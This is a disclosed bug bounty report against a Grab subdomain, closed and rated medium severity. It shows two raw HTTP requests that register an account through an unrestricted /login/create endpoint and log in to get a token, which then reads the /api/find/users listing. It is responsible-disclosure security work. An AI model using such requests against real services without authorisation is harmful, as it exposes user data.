# Registration enabled on ███grab.com

## Report Details
- **Report ID**: 318099
- **URL**: https://hackerone.com/reports/318099
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-21T06:45:22.310Z
- **Disclosed**: 2018-02-28T05:16:59.947Z

## Reporter
- **Username**: grouptherapy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: grab

## Vulnerability Information
**Summary:**
An attacker can register an account on the `█████████grab.com` service, and access information from the service


**Description:** 
While logging in via Google accounts is prohibited, an attacker can register an account through the `/login/create` endpoint, as per the below request
```
POST /login/create HTTP/1.1
Host: █████grab.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://███grab.com/
Authorization: Bearer null
Content-Type: application/json
Content-Length: 61
Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0
Connection: close

{"userid":"█████","password":"██████"}
```


This can then be used to log in via the `/login` endpoint ,as in the following request:
```
POST /login HTTP/1.1
Host: █████grab.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████grab.com/
Authorization: Bearer null
Content-Type: application/json
Content-Length: 61
Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0
Connection: close

{"userid":"██████","password":"████"}
```
which returns a valid token. F265433

This token can be used to access some of the endpoints, such as
`/api/find/users`, as in the following request: F265434

## Impact

An attacker can access information in the system such as registered users. The application appears to be newly developed, and as such little information is stored currently.

## Attachments
No attachments
